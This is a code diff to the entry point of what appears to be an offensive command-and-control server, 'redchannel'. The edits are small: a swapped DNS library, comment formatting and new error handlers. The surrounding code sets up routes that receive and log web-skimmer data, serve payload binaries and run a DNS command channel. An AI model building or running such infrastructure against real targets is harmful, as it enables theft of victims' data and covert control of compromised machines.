@@ -1,5 +1,5 @@
 import chalk from "chalk";
-import * as dnsd from "dnsd";
+import * as dnsd from "dnsd2";
 import * as fs from "fs";
 import { Command as Commander } from "commander";
 
@@ -23,8 +23,8 @@ cli.version(Constants.VERSION, "-v, --version")
     .option("-d, --debug", "enable debug", false)
     .parse(process.argv);
 
-const cliPassword = process.env.RC_PASSWORD ?? cli.getOptionValue("password");
 // env password takes priority over commandline
+const cliPassword = process.env.RC_PASSWORD ?? cli.getOptionValue("password");
 if (!cliPassword) {
     new Logger().error("please specify a master c2 password via command-lie or environment variable, see '--help'");
     process.exit(1);
@@ -68,8 +68,9 @@ webServer.listen(redchannel.modules.c2.config.web_port, redchannel.modules.c2.co
 });
 
 /**
- Skimmer routes
+ * Skimmer routes
  */
+
 // incoming skimmer data
 webServer.get(redchannel.modules.skimmer.config.data_route, (request, response) => {
     ui.debug(`incoming skimmer raw data: ${JSON.stringify(request.query)}`);
@@ -101,9 +102,18 @@ webServer.get(redchannel.modules.c2.config.binary_route, (request, response) => 
 });
 
 /**
- DNS channel
+ * DNS channel
  */
-const dnsServer = dnsd.createServer(redchannel.c2MessageHandler);
+
+process.on("uncaughtException", (ex, err) => {
+    ui.error(`process error: ${emsg(ex)}`);
+});
+
+const dnsServer = dnsd.createServer(redchannel.c2MessageHandler.bind(redchannel));
+
+dnsServer.on("error", (ex, err) => {
+    ui.error(`dns server error: ${emsg(ex)}, msg: ${emsg(err)}`);
+});
 // prettier-ignore
 dnsServer
     .zone(
